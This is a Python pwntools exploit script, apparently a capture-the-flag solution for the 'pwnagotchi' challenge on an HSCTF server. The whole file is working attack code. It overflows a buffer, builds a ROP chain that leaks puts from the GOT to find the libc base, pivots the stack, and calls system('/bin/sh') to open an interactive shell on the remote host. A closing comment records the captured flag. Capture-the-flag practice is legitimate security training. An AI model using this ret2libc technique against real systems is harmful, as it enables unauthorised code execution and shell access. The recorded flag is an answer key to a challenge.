from pwn import *


binpath = './pwnagotchi'
elf = ELF(binpath)
libc = elf.libc

context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
b *0x400988
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('pwn.hsctf.com', 5005)
# io = process(binpath)


io.recvuntil(b'name: \n')

ret = 0x400285
pop_rdi = 0x4009f3
pop_rsi_r15 = 0x4009f1
pop_rbp = 0x400768
leave_ret = 0x400987
addr_pivot = 0x601000 + 0x500

payload = b''
payload += b'A' * (0xc + 0x8)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(pop_rdi)
payload += p64(addr_pivot)
payload += p64(elf.plt['gets'])
payload += p64(pop_rbp)
payload += p64(addr_pivot - 8)
payload += p64(leave_ret)

io.sendline(payload)

io.recvuntil(b'happy!\n')

addr_puts = u64(io.recvline().rstrip().ljust(8, b'\x00'))
addr_libc = addr_puts - libc.symbols['puts']

print('addr_puts = 0x{:x}'.format(addr_puts))
print('addr_libc = 0x{:x}'.format(addr_libc))

# send second stack
payload = b''
payload += p64(pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])

io.sendline(payload)


io.interactive()


# flag{theyre_so_cute}
